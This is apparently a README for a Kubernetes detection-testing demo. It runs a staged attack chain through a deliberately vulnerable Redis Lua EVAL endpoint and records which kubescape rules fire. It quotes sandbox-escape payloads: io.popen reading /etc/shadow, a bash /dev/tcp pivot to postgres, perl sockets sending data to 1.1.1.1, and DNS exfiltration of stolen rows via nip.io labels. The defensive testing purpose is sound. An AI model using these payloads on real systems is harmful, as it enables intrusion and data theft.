# Chain demo — single e2e multi-pod attack chain

A 4-component sbob demo that runs ONE realistic attack chain across the
namespace and produces a coverage table showing which detection rules
fired and which were silent. Both classes are demo features — the
silent ones map directly to operator knobs you can flip.

## The chain (one attacker, six stages, four pods involved)

```
                       ┌─ user / attacker ─┐
                       │      HTTP         │
                       ▼                   ▼
                   ┌─ chain-frontend ──────────────────┐
                   │  /api/products → backend          │   benign
                   │  /api/cache/eval → redis EVAL     │   *vulnerable feature*
                   └────────────┬───────────────┬──────┘
                                │ HTTP          │ RESP
                                ▼               ▼
            ┌─ chain-backend ──────────┐  ┌─ chain-redis (vulnerable image) ─┐
            │  /api/products → pg      │  │ Lua sandbox patched: io.popen()   │
            │                          │  │ reachable from EVAL.               │
            └──────────┬───────────────┘  │ During attack chain:               │
                       │ pg-wire           │   spawns: cat, bash, perl          │
                       ▼                   │   s2  cat → /etc/shadow            │
            ┌─ chain-postgres ─────────┐  │   s3  bash → /dev/tcp:5432 (SSL probe)│
            │  postgres:16              │  │   s4  perl → external:80 (HTTP)    │
            │  AUTH_METHOD=trust        │  │   s5  perl → pg-wire Startup+Query  │
            │  (extended chain)         │  │       (extracts ROW back via HTTP)  │
            └──────────────▲────────────┘  │   s6  perl → DNS labels w/ base32   │
                           │               │       encoded ROW (one per chunk)   │
                           │               └──────┬──────────────────────┬──────┘
              pg-wire data (s5 row)               │                      │
                           │                      │ raw TCP / UDP        │ DNS
                           └──────────────────────┘                      ▼
                                                            1.1.1.1:80 + *.1.1.1.1.nip.io
                                                          (data leaves the cluster
                                                          encoded into HTTP query / DNS labels)
```

### Stage 1 · `s1-recon-benign-eval` — **BLIND by design**
Attacker confirms `/api/cache/eval` accepts arbitrary Lua by submitting
the same legitimate atomic-counter script that benign traffic uses.
`return redis.call("INCR", KEYS[1])`. Nothing fires — this is literally
the feature.

### Stage 2 · `s2-escape-sandbox-read-shadow` — **DETECTED**
Attacker submits Lua that:
1. Tries `io.popen` directly (succeeds — this is the chain-redis image's
   patched-Lua vulnerability).
2. Falls back to `package.loadlib('/usr/lib/liblua5.1.so.0','luaopen_io')`
   if direct access fails (covers vanilla redis with stricter sandbox).
3. `io.popen("cat /etc/shadow | head -c 200")` — spawns `cat` inside
   the redis pod and reads the sensitive file.

| Rule | Container | Trigger | Status |
|---|---|---|---|
| R0001 Unexpected process launched | redis | comm=`cat` not in AP | DETECTED |
| R0010 Unexpected Sensitive File Access | redis | `/etc/shadow` | DETECTED |

### Stage 3 · `s3-pivot-redis-as-pg-client` — **partially DETECTED**
Same sandbox escape, different popen target:
`io.popen("bash -c 'exec 3<>/dev/tcp/chain-postgres/5432; printf <pg-startup-bytes> >&3; head -c 30 <&3 | base64'")`
The redis pod now actively speaks pg-wire to postgres — the "redis as a
postgres client" pivot. `/bin/sh` is dash (no /dev/tcp); we explicitly
invoke `bash`.

| Rule | Container | Trigger | Status |
|---|---|---|---|
| R0001 Unexpected process launched | redis | comm=`bash` not in AP | DETECTED |
| R0011 Unexpected Egress Network Traffic | redis | postgres:5432 not in NN | **BLIND-by-design** — R0011's expression filters private IPs (`!net.is_private_ip`); cluster-internal traffic isn't what it's looking for. s4 exercises the external-egress leg. |

### Stage 4 · `s4-exfil-to-internet` — **DETECTED**
Same escape, perl raw-socket to a real public IP:
`io.popen("perl -e 'use IO::Socket::INET; my $s=IO::Socket::INET->new(PeerAddr=>q{1.1.1.1:80},...); ...'")`
The perl child opens TCP to **1.1.1.1:80** (cloudflare DNS, also
listens on HTTP) — a real outbound packet leaves the cluster.

| Rule | Container | Trigger | Status |
|---|---|---|---|
| R0001 Unexpected process launched | redis | comm=`perl` not in AP | DETECTED |
| R0011 Unexpected Egress Network Traffic | redis | 1.1.1.1:80 not in NN, public | DETECTED |

### Stage 5 · `s5-pivot-pg-protocol-extract-row` — **EXTENDED, partially DETECTED**
*(opt-in via `--extended`; basic chain ends at Stage 4)*

Stage 3 only sent a single 8-byte SSLRequest and parsed the `N` reply —
proves connectivity but never speaks an actual session. Stage 5 fixes
that:

- perl one-liner inside `io.popen` opens TCP to `chain-postgres:5432`
- Sends a v3 StartupMessage (`user=postgres database=postgres`)
- Reads back `R` AuthenticationOk (requires `POSTGRES_HOST_AUTH_METHOD=trust`)
- Sends `Q SELECT current_database()||':'||current_user||':'||version()`
- Parses the `D` DataRow and prints `PG_ROW=<actual-postgres-row-content>`

The HTTP response from `/api/cache/eval` now carries the extracted
postgres row back through the frontend — actual cross-pod data leak,
not just a connectivity probe.

| Rule | Container | Trigger | Status |
|---|---|---|---|
| R0001 Unexpected process launched | redis | comm=`perl` not in AP | DETECTED |
| R0011 Unexpected Egress Network Traffic | redis | chain-postgres:5432 not in NN | **BLIND-by-design** — private cluster IP; R0011 filters those by design. |

### Stage 6 · `s6-dns-exfil-of-stolen-row` — **EXTENDED, DETECTED**
*(opt-in via `--extended`)*

Same primitive as s5, different sink. After extracting the postgres
row, perl base32-encodes it and issues one `getent hosts
<chunk>.1.1.1.1.nip.io` per 30-char chunk. `nip.io` is a public
wildcard DNS service — every subdomain of `<a.b.c.d>.nip.io`
resolves to the IP, so each chunk is a guaranteed-resolvable DNS
query. node-agent's `trace_dns` gadget observes each lookup;
R0005 fires per chunk and alertmanager records the encoded label in
`alert.labels.address` — operators see the leaked bytes in the SIEM.

| Rule | Container | Trigger | Status |
|---|---|---|---|
| R0001 Unexpected process launched | redis | comm=`perl` | DETECTED |
| R0005 DNS Anomalies in container | redis | DNS query per encoded chunk to `*.1.1.1.1.nip.io` | DETECTED |

### Coverage summary

Basic chain (4 stages, default `./scripts/local-ci-chain.sh`):

```
Coverage: 6 / 6 expected detections matched

s2 (escape+sensitive-read):    R0001 ✓  R0010 ✓
s3 (pivot via /dev/tcp):       R0001 ✓  R0011 ✓*
s4 (exfil via perl → 1.1.1.1): R0001 ✓  R0011 ✓
```

Extended chain (6 stages, `--extended`):

```
Coverage: 10 / 10 expected detections matched

s2 (escape+sensitive-read):                R0001 ✓  R0010 ✓
s3 (pivot via /dev/tcp):                   R0001 ✓  R0011 ✓*
s4 (exfil via perl → 1.1.1.1):             R0001 ✓  R0011 ✓
s5 (real pg-wire + row extract):           R0001 ✓  R0011 ✓*
s6 (DNS exfil → *.1.1.1.1.nip.io):         R0001 ✓  R0005 ✓ (one alert per chunk)
```

**`*` Matcher attribution caveat:** the verifier counts a
rule+container fingerprint as DETECTED if ANY alert on that
(rule_id, container_name) pair landed in alertmanager. R0011's
expression explicitly filters private IPs
(`!net.is_private_ip(event.dstAddr)`), so the *unique* R0011 event
the cluster actually produces comes from s4 (1.1.1.1) — but s3
and s5 expectations also count it as a match because they share
`(R0011, redis)`. The chain's narrative still holds: R0011 reaches
alertmanager, and s4 is the stage that genuinely exercises the
external-egress detection path.

The R0005 alerts in s6 are not subject to this — each chunk
produces a unique `(rule_id, container_name, event.name)` tuple so
the count of alerts visible in alertmanager matches the number of
base32 chunks.

## sbobs (learned by kubescape, exported under `sbobs/`)

| File | Highlights |
|---|---|
| `sbobs/ap-chain-frontend.yaml` | execs: `/chain-frontend` only (distroless Go binary) |
| `sbobs/nn-chain-frontend.yaml` | egress: kube-dns:53, chain-backend:8080, **chain-redis:6379** (EVAL traffic IS learned because /api/cache/eval is a legitimate feature) |
| `sbobs/ap-chain-backend.yaml` | execs: `/chain-backend` only |
| `sbobs/nn-chain-backend.yaml` | egress: kube-dns:53, chain-postgres:5432 (NO redis — backend doesn't talk to redis in this app) |
| `sbobs/ap-chain-redis.yaml` | execs: `/usr/local/bin/redis-server` only — every spawned binary (cat, bash, perl) is novel ⇒ R0001 fires reliably |
| `sbobs/nn-chain-redis.yaml` | egress: **empty** — every outbound is novel ⇒ R0011 *would* fire if `networkEventsStreaming` were enabled |
| `sbobs/ap-chain-postgres.yaml` | execs: 17 unique paths (postgres, psql, bash, sh, cat, find, …) |
| `sbobs/nn-chain-postgres.yaml` | egress: empty |

The narrow chain-redis sbob (one exec, zero egress) is what makes the
attack DETECTABLE in principle. The cluster's two-knob suppression is
what makes most of it BLIND in practice.

## Components

| Pod | Image | Role |
|---|---|---|
| `chain-frontend` | `ghcr.io/k8sstormcenter/chain-frontend:latest` | ~180-LOC Go service: HTML + /api/products proxy + **/api/cache/eval RESP proxy** (legitimate atomic-counter feature, untrusted script content) |
| `chain-backend` | `ghcr.io/k8sstormcenter/chain-backend:latest` | ~180-LOC Go service: serves /api/products from postgres |
| `chain-redis` | `ghcr.io/k8sstormcenter/redis-vulnerable:7.2.10` | Same patched-Lua image used by `example/redis-vulnerable.yaml` — CVE-2022-0543 reproduced (io reachable from EVAL) |
| `chain-postgres` | `postgres:16` | Upstream image, no customisation |

All images pull anonymously from GHCR (permanent tags, no rot). The two
custom Go services are published by CI (`.github/workflows/ci-chain-images.yaml`)
on every push to `main`; `chain.yaml` references them directly, so
`kubectl apply -f chain.yaml` just works. ttl.sh is only used by the
opt-in `--build` dev flow below.

## Run it

Pre-req: kubescape + alertmanager already installed in the cluster.
(run `./scripts/local-ci.sh --setup-only` on any existing app if not.)

### Default flow (pulls published GHCR images — no docker required)

```bash
./scripts/local-ci-chain.sh                  # full pipeline (pulls GHCR images)
./scripts/local-ci-chain.sh --setup-only     # deploy + learn 4 sbobs
./scripts/local-ci-chain.sh --attack-only    # re-run chain + coverage
./scripts/local-ci-chain.sh --teardown       # remove the chain namespace
CHAIN_PUBLISHED_TAG=abc1234 ./scripts/local-ci-chain.sh   # pin a SHA instead of :latest
```

### Dev flow (build the Go sources locally + push to ttl.sh)

Use `--build` only when iterating on `example/chain/{frontend,backend}/`;
it builds both images and pushes them to ttl.sh (24h ephemeral, no auth)
instead of pulling GHCR:

```bash
./scripts/local-ci-chain.sh --build          # local docker build + ttl.sh push
```

The published images (built + pushed by
`.github/workflows/ci-chain-images.yaml` on every push to `main`) are:

| Image | Tag policy |
|---|---|
| `ghcr.io/k8sstormcenter/chain-frontend` | `<short-sha>`, `<branch>`, `latest` (main only) |
| `ghcr.io/k8sstormcenter/chain-backend` | same |

Each publish runs the Go TDD test suite as a gate AND smoke-tests the
final image's `/healthz` before tagging — so a passing CI run means
the published image is at least runnable.

Expected end-of-run output:

```
SCENARIO                              RULE    CONTAINER  COMM    STATUS
s2-escape-sandbox-read-shadow         R0001   redis      cat     DETECTED
s2-escape-sandbox-read-shadow         R0010   redis              DETECTED
s3-pivot-redis-as-pg-client           R0001   redis      bash    DETECTED
s3-pivot-redis-as-pg-client           R0011   redis              BLIND
s4-exfil-to-internet                  R0001   redis      perl    DETECTED
s4-exfil-to-internet                  R0005   redis              BLIND
s4-exfil-to-internet                  R0011   redis              BLIND

Coverage: 4 / 7 expected detections matched
```

## Architecture choices

- **Single AttackSuite target = frontend.** Reuses `bobctl attack` verbatim
  for HTTP delivery. Every chain stage enters as one POST to
  `/api/cache/eval`. Detections happen wherever syscalls actually fire;
  `expectedDetections.containerName` tells the verifier which pod to
  look in.
- **Verifier is bash + jq, not Go.** `pkg/autotune` tuner restricts
  alerts to the baseline profile's containers — wrong shape for a
  cross-pod chain. A ~30-line bash verifier matches expectations
  against alertmanager's active alert set without touching `pkg/`.
- **chain-redis = the repo's redis-vulnerable image.** Vanilla redis:7.2
  hardens the Lua sandbox and the escape returns "sandbox_blocked".
  The patched image is the canonical "fileless vulnerability" precondition.
- **chain-postgres = postgres:16 upstream.** No custom image — postgres
  doesn't need to be vulnerable for this chain; postgres is the data
  source the chain exfils FROM.
- **GHCR for the two custom Go images.** Permanent tags, published by CI
  (`ci-chain-images.yaml`), pulled anonymously — no rot, no rebuild tax.
  ttl.sh is the opt-in `--build` dev path for local Go-source iteration.

## TDD discipline

- `backend/main_test.go` — 7 tests pinning backend behavior
- `frontend/main_test.go` — 7 tests pinning that /api/cache/eval forwards
  the Lua script VERBATIM (sanitising at the frontend layer would
  silently break the chain)
- Script's TDD gate runs `go test ./...` for both components before
  docker build — bad commits fail before reaching the cluster

## Files

```
example/chain/
├── README.md                      ← this file
├── chain.yaml                     ← 4 deployments + 4 services + 1 configmap
├── chain-attacks.yaml             ← AttackSuite (4 stages, 7 expectations)
├── chain-functional-tests.yaml    ← benign baseline (5 reqs for learning)
├── sbobs/                         ← realistic AP+NN exported from cluster
│   ├── ap-chain-{frontend,backend,redis,postgres}.yaml
│   └── nn-chain-{frontend,backend,redis,postgres}.yaml
├── frontend/                      ← Go service, isolated go.mod
│   ├── go.mod  go.sum
│   ├── main.go  main_test.go      ← /api/cache/eval forwards verbatim
│   └── Dockerfile
└── backend/                       ← Go service, isolated go.mod
    ├── go.mod  go.sum
    ├── main.go  main_test.go      ← serves /api/products
    └── Dockerfile

scripts/local-ci-chain.sh          ← orchestration (~220 LOC bash)
```

No edits to `pkg/`, no edits to existing `example/*` files, no new Go
package in the bobctl codebase.
